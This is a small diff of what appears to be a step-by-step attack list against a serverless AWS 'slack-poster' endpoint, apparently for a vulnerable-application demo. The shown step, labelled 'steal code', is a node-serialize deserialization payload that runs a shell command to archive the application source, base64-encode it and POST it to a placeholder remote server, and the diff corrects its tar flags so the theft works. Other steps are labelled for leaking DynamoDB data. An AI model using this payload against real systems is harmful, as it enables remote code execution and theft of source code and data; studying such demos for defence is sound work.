@@ -6,7 +6,7 @@ curl -X POST -H "Content-Type: application/json" https://____API____.execute-api
 
 
 2 (steal code):
-curl -X POST -H "Content-Type: application/json" https://____API____.execute-api._____REGION_____.amazonaws.com/dev/slack-poster --data '{"text":"hello", "username":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"tar -xvzf /tmp/source.tar.gz ./; b=`base64 --wrap=0 /tmp/source.tar.gz`; curl -X POST ____REMOVE_SERVER____ --data $b\",function(error,stdout,stderr){console.log(stdout)});}()"}'
+curl -X POST -H "Content-Type: application/json" https://____API____.execute-api._____REGION_____.amazonaws.com/dev/slack-poster --data '{"text":"hello", "username":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"tar -pcvzf /tmp/source.tar.gz ./; b=`base64 --wrap=0 /tmp/source.tar.gz`; curl -X POST ____REMOVE_SERVER____ --data $b\",function(error,stdout,stderr){console.log(stdout)});}()"}'
 
 
 3 (leak dynamo)
